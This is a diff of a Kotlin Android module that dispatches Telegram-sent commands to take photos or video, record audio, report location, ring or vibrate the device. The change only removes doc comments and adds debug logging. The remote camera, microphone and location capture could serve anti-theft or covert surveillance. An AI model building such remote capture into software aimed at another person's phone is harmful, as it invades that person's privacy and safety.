@@ -7,14 +7,6 @@ import org.json.JSONObject
 object ActionHandlers {
     /**
      * Dispatches remote actions based on incoming command parameters.
-     *
-     * @param context The application context.
-     * @param type The action type (e.g., "photo", "video", "audio", "location", "ring", "vibrate").
-     * @param camera Camera parameter, e.g., "front" or "rear".
-     * @param flash Flash parameter, e.g., "true" or "false".
-     * @param quality Quality parameter, e.g., "720p".
-     * @param duration Duration parameter, as String (should be parsed to Int if needed).
-     * @param chatId The Telegram user/chat ID.
      */
     fun dispatch(
         context: Context,
@@ -34,6 +26,7 @@ object ActionHandlers {
                     val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: 720
                     val durationInt = duration?.toIntOrNull() ?: if (type == "video") 60 else 0
 
+                    Log.d("ActionHandlers", "Starting ForegroundActionService for camera: cam=$cam, flash=$flashEnabled, quality=$qualityInt, duration=$durationInt, chatId=$chatId")
                     ForegroundActionService.startCameraAction(
                         context,
                         type,
@@ -48,6 +41,7 @@ object ActionHandlers {
                 }
                 "audio" -> {
                     val durationInt = duration?.toIntOrNull() ?: 60
+                    Log.d("ActionHandlers", "Starting ForegroundActionService for audio: duration=$durationInt, chatId=$chatId")
                     ForegroundActionService.startAudioAction(
                         context,
                         JSONObject().apply {
@@ -57,12 +51,15 @@ object ActionHandlers {
                     )
                 }
                 "location" -> {
+                    Log.d("ActionHandlers", "Starting ForegroundActionService for location: chatId=$chatId")
                     ForegroundActionService.startLocationAction(context, chatId)
                 }
                 "ring" -> {
+                    Log.d("ActionHandlers", "Starting ForegroundActionService for ring")
                     ForegroundActionService.startRingAction(context, JSONObject())
                 }
                 "vibrate" -> {
+                    Log.d("ActionHandlers", "Starting ForegroundActionService for vibrate")
                     ForegroundActionService.startVibrateAction(context, JSONObject())
                 }
                 else -> {
